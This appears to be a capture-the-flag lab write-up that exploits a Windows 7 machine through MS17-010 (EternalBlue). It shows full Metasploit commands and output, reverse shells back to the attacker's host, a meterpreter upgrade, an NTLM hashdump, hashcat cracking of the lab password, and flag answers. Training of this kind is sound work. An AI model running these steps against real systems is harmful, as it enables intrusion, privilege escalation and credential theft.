# Blue

## 1. Recon
Reconnaissance

### Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)
`❯ nmap --script=vuln -sV -A 10.10.233.113`

```
Nmap scan report for 10.10.233.113
Host is up (0.43s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_ssl-ccs-injection: No reply from server (TIMEOUT)
|_sslv2-drown: 
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 161.25 seconds
```


### How many ports are open with a port number under 1000?
`3`

### What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
`ms17-010`

---

## 2. Gain Access
### Start metasploit
`done`

### Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
```
msf6 > search ms17-010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 5, use 5 or use exploit/windows/smb/smb_doublepulsar_rce
```

`exploit/windows/smb/ms17_010_eternalblue`

### Show options and set the one required value. What is the name of this value? (All caps for submission)
```
msf6 > use 2
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
```

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set MY_IP
RHOSTS => MY_IP
```
RHOSTS

### Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:
`set payload windows/x64/shell/reverse_tcp`


### With that done, run the exploit!
```

msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.2.60.96:4444 
[*] 10.10.233.113:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.233.113:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.233.113:445     - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.233.113:445 - Connecting to target for exploitation.
[+] 10.10.233.113:445 - Connection established for exploitation.
[+] 10.10.233.113:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.233.113:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.233.113:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.233.113:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.233.113:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.233.113:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.233.113:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.233.113:445 - Sending all but last fragment of exploit packet
[*] 10.10.233.113:445 - Starting non-paged pool grooming
[+] 10.10.233.113:445 - Sending SMBv2 buffers
[+] 10.10.233.113:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.233.113:445 - Sending final SMBv2 buffers.
[*] 10.10.233.113:445 - Sending last fragment of exploit packet!
[*] 10.10.233.113:445 - Receiving response from exploit packet
[+] 10.10.233.113:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.233.113:445 - Sending egg to corrupted connection.
[*] 10.10.233.113:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.233.113
[*] Command shell session 1 opened (10.2.60.96:4444 -> 10.10.233.113:49214) at 2021-02-01 23:22:21 -0500
[+] 10.10.233.113:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.233.113:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.233.113:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
```

### Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target. 
`done`

---

## 3. Escalate

### If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 
```

msf6 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter
```
`post/multi/manage/shell_to_meterpreter`

### Select this (use MODULE_PATH). Show options, what option are we required to change? (All caps for answer)
```
msf6 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.
```

### Set the required option, you may need to list all of the sessions to find your target here. 
```
msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type               Information  Connection
  --  ----  ----               -----------  ----------
  1         shell x64/windows               10.2.60.96:4444 -> 10.10.233.113:49214 (10.10.233.113)

msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1
```
`SESSION`

### Run! If this doesn't work, try completing the exploit from the previous task once more.
```
msf6 post(multi/manage/shell_to_meterpreter) > exploit

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.2.60.96:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (175174 bytes) to 10.10.233.113
[*] Meterpreter session 2 opened (10.2.60.96:4433 -> 10.10.233.113:49229) at 2021-02-01 23:34:34 -0500
[*] Stopping exploit/multi/handler
```

Note: we could also try 
`sessions -u 1`
`-u <opt>  Upgrade a shell to a meterpreter session on many platforms`

tried though, didnt work


### Once the meterpreter shell conversion completes, select that session for use.
run: `session 2`


### Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again. 
```
meterpreter > shell
Process 1400 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami 
whoami
nt authority\system
```

### List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).
`done`


### Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. 
`done`

---

## 4. Cracking
### Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 
```
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```
`Jon`



### Copy this password hash to a file and research how to crack it. What is the cracked password?
```
❯ hashcat -a 0 -m 1000 crack.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i3-6006U CPU @ 2.00GHz, 2726/2790 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22        
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: ffb43f0de35be4d9917ac0cc8ad57f8d
Time.Started.....: Tue Feb  2 00:08:23 2021 (6 secs)
Time.Estimated...: Tue Feb  2 00:08:29 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1705.7 kH/s (0.39ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10203136/14344385 (71.13%)
Rejected.........: 0/10203136 (0.00%)
Restore.Point....: 10199040/14344385 (71.10%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: alsinah -> alonsouriel

Started: Tue Feb  2 00:07:53 2021
Stopped: Tue Feb  2 00:08:32 2021
```
`alqfna22`

## 5. Find Flags

```
meterpreter > search -f flag*.txt
Found 6 results...
    c:\Documents and Settings\Jon\Documents\flag3.txt (37 bytes)
    c:\Documents and Settings\Jon\My Documents\flag3.txt (37 bytes)
    c:\flag1.txt (24 bytes)
    c:\Users\Jon\Documents\flag3.txt (37 bytes)
    c:\Users\Jon\My Documents\flag3.txt (37 bytes)
    c:\Windows\System32\config\flag2.txt (34 bytes)
```


###  Flag1? This flag can be found at the system root.  
`1337`

### Flag2? This flag can be found at the location where passwords are stored within Windows.
`1337`

### Flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 
`1337`

---
